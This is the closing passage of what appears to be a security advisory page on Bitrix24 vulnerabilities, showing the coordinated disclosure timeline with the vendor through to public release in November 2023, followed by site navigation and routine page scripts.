<li>2023-03-21 Email to <a href="/cdn-cgi/l/email-protection#2c45424a436c4e45585e4554024f4341"><span class="__cf_email__" data-cfemail="b1d8dfd7def1d3d8c5c3d8c99fd2dedc">[email&#160;protected]</span></a></li>
<li>2023-03-21 Email to <a href="/cdn-cgi/l/email-protection#c2abaca4ad82f3a1efa0abb6b0abbaecb0b7"><span class="__cf_email__" data-cfemail="e0898e868fa0d183cd828994928998ce9295">[email&#160;protected]</span></a></li>
<li>2023-03-24 Got reply from <a href="/cdn-cgi/l/email-protection#442d2a222b04752769262d30362d3c6a3631"><span class="__cf_email__" data-cfemail="f59c9b939ab5c496d8979c81879c8ddb8780">[email&#160;protected]</span></a>, they asked us to email to <a href="/cdn-cgi/l/email-protection#d9b0b7bfb699bbb0adabb0a1f7bab6b4"><span class="__cf_email__" data-cfemail="cfa6a1a9a08fada6bbbda6b7e1aca0a2">[email&#160;protected]</span></a> or use the form at <a href="https://www.bitrix24.com/report/">https://www.bitrix24.com/report/</a> with regards to the bug reports</li>
<li>2023-03-29 Emailed to [redacted], [redacted] &amp; [redacted]. Team member found the 3 email addresses via an [USA bug bounty platform]</li>
<li>2023-03-30 [redacted] replied to us</li>
<li>2023-03-31 [redacted] wanted us to report the bugs via that [USA bug bounty platform]</li>
<li>2023-03-31 Emailed back to [redacted] that we are unable to do so because it&rsquo;s a private program in that [USA bug bounty platform]</li>
<li>2023-03-31 [redacted] emailed back with the invite</li>
<li>2023-03-31 Submitted the reports via that [USA bug bounty platform]</li>
<li>2023-03-31 Informed [redacted] again that we are unable to report all the bugs due to [blah blah blah Requirements]</li>
<li>2023-04-03 [redacted] replied that they had remove the [blah blah blah Requirements] limitations for us</li>
<li>2023-04-04 We submitted the final 2 reports</li>
<li>2023-06-21 [redacted] emailed us &ldquo;Generally, we prefer not to publish CVE, because our clients tend to postpone or skip even critical updates, and hackers definitely will be using this information for attacking our clients. It have happened several times in the past, with huge consequences for our company and for our clients. To tell the truth, I would like to set award on [USA bug bounty platform] instead of CVE publishing. Please let me know what do you think about that.&rdquo;</li>
<li>2023-06-23 Emailed back to Bitrix that we prefer to publish the CVE and do not want the reward. We are also willing to delay the publication at a mutually agreed date.</li>
<li>2023-09-22 [redacted] finally replied asking us if we are agreeable to publish the CVE in November 2023</li>
<li>2023-09-22 Emailed back that we are agreeable to delay the publication to 1st November 2023</li>
<li>2023-09-22 [redacted] accepted the date</li>
<li>2023-11-01 Public Release</li>
</ul>


  </div>

  <footer class="post-footer">
    <ul class="post-tags">
    </ul>
<nav class="paginav">
  <a class="prev" href="https://starlabs.sg/advisories/23/23-4226/">
    <span class="title">« Prev</span>
    <br>
    <span>(CVE-2023-4226) Chamilo LMS Work Ajax File Upload Functionality Remote Code Execution</span>
  </a>
  <a class="next" href="https://starlabs.sg/advisories/23/23-1714/">
    <span class="title">Next »</span>
    <br>
    <span>(CVE-2023-1714) Bitrix24 Remote Command Execution (RCE) via Unsafe Variable Extraction</span>
  </a>
</nav>

  </footer>
</article>
    </main>
    
<footer class="footer">
    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
    <span>
        Powered by
        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
    </span>
</footer>
<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
        <path d="M12 6H0l6-6z" />
    </svg>
</a>

<script data-cfasync="false" src="/cdn-cgi/scripts/5c5dd728/cloudflare-static/email-decode.min.js"></script><script>
    let menu = document.getElementById('menu')
    if (menu) {
        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
        menu.onscroll = function () {
            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
        }
    }

    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
        anchor.addEventListener("click", function (e) {
            e.preventDefault();
            var id = this.getAttribute("href").substr(1);
            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
                    behavior: "smooth"
                });
            } else {
                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
            }
            if (id === "top") {
                history.replaceState(null, null, " ");
            } else {
                history.pushState(null, null, `#${id}`);
            }
        });
    });

</script>
<script>
    var mybutton = document.getElementById("top-link");
    window.onscroll = function () {
        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
            mybutton.style.visibility = "visible";
            mybutton.style.opacity = "1";
        } else {
            mybutton.style.visibility = "hidden";
            mybutton.style.opacity = "0";
        }
    };

</script>
</body>

</html>
